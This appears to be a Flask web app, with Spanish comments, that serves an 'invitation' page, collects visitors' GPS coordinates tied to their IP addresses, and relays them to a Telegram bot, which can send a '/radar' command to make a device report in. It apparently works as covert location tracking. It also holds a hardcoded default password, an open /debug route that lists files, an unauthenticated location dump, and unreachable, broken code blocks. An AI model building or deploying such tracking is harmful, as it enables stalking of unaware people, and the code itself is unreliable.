# -*- coding: utf-8 -*-
from flask import Flask, render_template, request, jsonify, abort
import json
import os
import requests

app = Flask(__name__, static_folder='static')

# Configuracion de Telegram
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
DATA_FILE = 'ubicaciones.json'
RADAR_FILE = 'radar_estado.txt'
ADMIN_PASSWORD = os.environ.get('APP_PASSWORD', 'Oficina321-')

def enviar_telegram(mensaje):
    """Envia mensajes a Telegram con formato HTML"""
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensaje, "parse_mode": "HTML"}
        try:
            requests.post(url, data=payload)
        except Exception as e:
            print(f"Error enviando a Telegram: {e}")

def cargar_datos():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try: return json.load(f)
            except: return []
    return []

def guardar_datos(datos):
    with open(DATA_FILE, 'w') as f:
        json.dump(datos, f)

# --- RUTAS WEB ---
@app.route('/debug')
def debug():
    import os
    return str(os.listdir('.'))

@app.route('/')
def index():
    return render_template('invitacion.html')

@app.route('/mapa')
def mapa():
    return render_template('mapa_proyectos.html')

# --- LOGICA DE UBICACION Y TELEGRAM ---
@app.route('/guardar_ubicacion', methods=['POST'])
def guardar_ubicacion():
    data = request.get_json()
    lat, lon = data.get('lat'), data.get('lon')
    if lat and lon:

        # 1. Leer el historial actual del archivo
        historial = []
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                try:
                    historial = json.load(f)
                except:
                    historial = []
        
        # 2. Agregar el nuevo punto
        # Usamos el IP del cliente como ID
        historial.append({"id": request.remote_addr, "lat": float(lat), "lng": float(lon)})
        
        # 3. Guardar en el archivo (mantenemos solo los Ultimos 50 registros)
        with open(DATA_FILE, 'w') as f:
            json.dump(historial[-50:], f)
            
        return "OK", 200
        return "Error", 400
    
@app.route('/obtener_ubicaciones')
def obtener_ubicaciones():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return f.read()
        return json.dumps([])
    
        # Reportar a Telegram
        map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        mensaje = (f"📍 <b>Ubicación detectada</b>\n"
                   f"Lat: {lat}\nLon: {lon}\n"
                   f"🔗 <a href='{map_link}'>Abrir en Google Maps</a>")
        enviar_telegram(mensaje)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error"}), 400

# --- LOGICA DEL RADAR ---
@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    data = request.get_json()
    if 'message' in data and data['message'].get('text') == '/radar':
        with open(RADAR_FILE, 'w') as f: f.write('activado')
        enviar_telegram("📡 <b>Radar activado.</b> El dispositivo reportara en breve.")
    return jsonify({"status": "ok"}), 200

@app.route('/api/verificar-radar')
def verificar_radar():
    if os.path.exists(RADAR_FILE):
        os.remove(RADAR_FILE)
        return jsonify({"radar_activo": True})
    return jsonify({"radar_activo": False})

if __name__ == '__main__':
    # Esto funciona tanto en tu PC como en la nube
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)